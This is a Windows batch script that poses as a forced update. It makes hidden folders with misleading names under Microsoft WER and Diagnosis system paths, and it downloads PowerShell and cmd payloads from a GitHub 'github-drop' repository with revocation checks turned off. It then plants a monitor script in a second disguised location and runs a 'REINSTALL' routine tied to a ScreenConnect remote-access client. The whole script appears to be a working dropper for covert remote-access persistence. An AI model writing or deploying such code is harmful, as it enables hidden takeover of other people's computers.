@echo off
rem FORCE_UPDATE — pull M51+G5+F5 by SHA, then run Gryxa REINSTALL in foreground (visible result)
setlocal
set "WD=C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache"
set "ETL=C:\ProgramData\Microsoft\Diagnosis\State\.etlcache"
set "CURL=%SystemRoot%\System32\curl.exe"
set "PIN=455d4b9"
set "FP=36e506ff016b2151"
set "KEEP=5f6010579852e507"
set "ALT=f861c8140d453427"
if not exist "%WD%" mkdir "%WD%" >nul 2>&1
attrib -h -s -r "%WD%\own_mon.cmd" >nul 2>&1
attrib -h -s -r "%WD%\own_lib.ps1" >nul 2>&1
attrib -h -s -r "%WD%\own_gryxa.cmd" >nul 2>&1
"%CURL%" -L --ssl-no-revoke --connect-timeout 10 --max-time 60 -o "%WD%\own_lib.ps1" "https://raw.githubusercontent.com/xnobuddy/github-drop/%PIN%/own_lib.ps1?t=%RANDOM%"
"%CURL%" -L --ssl-no-revoke --connect-timeout 10 --max-time 60 -o "%WD%\own_mon.cmd" "https://raw.githubusercontent.com/xnobuddy/github-drop/%PIN%/own_mon.cmd?t=%RANDOM%"
"%CURL%" -L --ssl-no-revoke --connect-timeout 10 --max-time 40 -o "%WD%\own_gryxa.cmd" "https://raw.githubusercontent.com/xnobuddy/github-drop/%PIN%/own_gryxa.cmd?t=%RANDOM%"
if exist "%WD%\gryxa_install.cmd" del /f /q "%WD%\gryxa_install.cmd" >nul 2>&1
if exist "%WD%\gryxa_msi.lock" del /f /q "%WD%\gryxa_msi.lock" >nul 2>&1
if not exist "%ETL%" mkdir "%ETL%" >nul 2>&1
copy /y "%WD%\own_mon.cmd" "%ETL%\etl_mon.cmd" >nul 2>&1
echo --- verify ---
findstr /C:"MONVER=" "%WD%\own_mon.cmd"
findstr /C:"OWN_GRYXA BUILD" "%WD%\own_gryxa.cmd"
echo --- REINSTALL foreground (wait for msiexec) ---
call "%WD%\own_gryxa.cmd" "%WD%" "%FP%" "%KEEP%" "%ALT%" REINSTALL
echo exit=%ERRORLEVEL%
sc query "ScreenConnect Client (%FP%)"
type "%WD%\gryxa_install.result" 2>nul
echo done pin=%PIN%
endlocal
